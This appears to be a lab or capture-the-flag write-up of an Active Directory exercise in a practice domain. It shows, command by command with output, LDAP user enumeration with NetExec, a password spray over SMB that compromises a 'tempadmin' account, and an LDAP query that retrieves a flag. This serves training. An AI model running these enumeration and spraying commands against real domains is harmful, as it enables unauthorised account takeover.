### Our first mission is: Enumerate and extract domain user accounts for password spray targeting

First thing I did was too go through node connections in bloodhound, especially `SSUPPORT@PENTESTLAB.local` user I saw, which was part of privileged groups. It had `Generic` and `AllExtendedRights` type of privileges on OUs and Users.

<img width="3456" height="1687" alt="Screenshot From 2026-06-24 19-27-57" src="https://github.com/user-attachments/assets/eca13e89-908d-4464-a163-c7c17a0e138d" />

---

Then, I went for setting up a password spray:
1. I would collect all users in a user.txt file.
2. I would use the user.txt and some passwords I encountered during AS-REP Roasting, Kerberoasting, leaked credential hunting, like 'Password', 'Password123' 'User@2025!' 'Password1' etc.

Blueprint:
`nxc ldap [1. Target IP] -u [2. Active Username] -p '[3. Password]' --users | awk '/[4. Parsing Filter]/ {print $[5. Column Number]}' | tee [6. Output File]`

Command:


# Phase 1: Enumerate all user objects via LDAP

```bash
nxc ldap 192.168.56.20 -u bh_intern -p 'User@2025!' --users
```

# Phase 2: Sanitize output and isolate raw usernames into a text list

```bash
nxc ldap 192.168.56.20 -u bh_intern -p 'User@2025!' --users | awk '/LDAP.*DC01/ {print $5}' | tee users.txt
```

<img width="2833" height="1822" alt="Screenshot From 2026-06-24 19-35-47" src="https://github.com/user-attachments/assets/8451e0e9-6287-4ca1-956b-323d7143fbf9" />


Explanation:

`nxc ldap`: Invokes NetExec's LDAP module to interact directly with the Active Directory directory service.

`192.168.56.20`: The network IP address of the target Domain Controller (`DC01`).

`-u bh_intern -p 'User@2025!'`: Supplies the initially compromised low-privileged credentials to authenticate the directory bind session.

`--users`: Instructs NetExec to dump all standard user accounts registered within the target domain partition context.

`awk '/LDAP.*DC01/ {print $5}'`: Trims down the terminal display output stream, dynamically matching lines containing the validation header and pulling only the 5th column data array corresponding to the raw user account names.

`tee users.txt`: Simultaneously streams the clean username list directly to standard terminal output and saves it cleanly to disk for downstream password spraying loops.

Brief Explanation:

> "Query the Active Directory database utilizing authenticated low-privileged access to map the full breadth of domain identities. The structural user dump lists every visible account, which we pipeline through terminal manipulation strings to construct a highly target-specific input list. Isolating these objects ensures clean string handoffs during automated authentication validation tests without generating parsing faults."

---

### Our next mission is: Execute a low-velocity password spraying campaign across the collected domain directory

Blueprint:
`nxc smb [1. Target IP] -u [2. User List Wordlist] -p '[3. Guess Password]' --continue-on-success`

Command:

```bash
nxc smb 192.168.56.20 -u users.txt -p 'Password123' --continue-on-success

```

<img width="3382" height="1351" alt="Screenshot From 2026-06-24 19-35-23" src="https://github.com/user-attachments/assets/ec981cc4-6894-4f36-b262-641c1fcdb6af" />

Found User: `tempadmin`

Explanation:

`nxc smb`: Launches the SMB protocol testing engine within NetExec to validate credentials against remote administration endpoints.

`192.168.56.20`: Directs the connection strings towards the primary Domain Controller to centralized authentication validation.

`-u users.txt`: Points the testing matrix to the sanitized text wordlist of domain usernames generated during the enumeration phase.

`-p 'Password123'`: Sets the explicit structural password guess (`Password123`) aligned with common company-wide default onboarding formulas.

`--continue-on-success`: Commands the testing loop engine to keep executing authentication pairs across the entire scope of the array even after a valid credential pair drops, preventing early thread termination and maximizing account capture potential.

Brief Explanation:

> "Launch a wide, single-password authentication spray utilizing SMB validation targets across the mapped corporate perimeter. This technique systematically evaluates the corporate policy baseline against lazy initial configurations or default account presets. The campaign returns immediate hits on weak secondary profiles, explicitly compromising the `tempadmin` profile with a `(Pwn3d!)` administrative status match."

---

### Our final mission is: Interrogate target directory attributes via the compromised session to extract hidden data strings

Blueprint:
`nxc ldap [1. Target IP] -u '[2. High-Priv Username]' -p '[3. Compromised Password]' --base-dn '[4. Search Anchor]' --query "([5. Search Filter])" "[6. Target Attributes]"`

Command:

```bash
nxc ldap 192.168.56.20 -u 'tempadmin' -p 'Password123' --base-dn "DC=PENTESTLAB,DC=local" --query "(sAMAccountName=*)" "cn telephoneNumber"

```


<img width="2990" height="1565" alt="Screenshot From 2026-06-22 22-06-19" src="https://github.com/user-attachments/assets/86eaa7bc-7dc4-4086-b7c1-e31f0ae93653" />


Explanation:

`nxc ldap`: Pivots back to the Active Directory database interface engine using elevated access lines to read deep schema flags.

`-u 'tempadmin' -p 'Password123'`: Authenticates using the credentials harvested from the password spraying stage.

`--base-dn "DC=PENTESTLAB,DC=local"`: Chains the root administrative search baseline explicitly to parse across every container object and organizational unit.

`--query "(sAMAccountName=*)"`: Commands the engine to parse through every account context row entry inside the targeted domain tree layout.

`"cn telephoneNumber"`: Filters the returned parameters to drop unrelated attributes, forcing the domain controller to present only the explicit Canonical Name details alongside the target telephone parameters.

Brief Explanation:

> "Leverage the freshly hijacked `tempadmin` session to perform a deeper, targeted read down the Active Directory object database structure. In environments where BloodHound identifies critical path mappings like GenericAll or WriteDacl over target objects, administrative profiles frequently hide sensitive data arrays within structural descriptive property strings. Scanning down the specific telephone data attributes maps individual system objects, completely uncovering the target flag string cleanly hidden within an operational field."

Interaction Workflow & Retrieval:

```text
LDAP        192.168.56.20   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:PENTESTLAB.local) (signing:None) (channel binding:No TLS cert) 
LDAP        192.168.56.20   389    DC01             [+] PENTESTLAB.local\tempadmin:Password123 (Pwn3d!)
...
LDAP        192.168.56.20   389    DC01             [+] Response for object: CN=Chloe Mercer,OU=BH-Users,OU=BH-Project,DC=PENTESTLAB,DC=local
LDAP        192.168.56.20   389    DC01             cn                   Chloe Mercer
LDAP        192.168.56.20   389    DC01             telephoneNumber      BHFLAG1{G3N3R1C4LL_4BUS3_P4TH_F1}

```
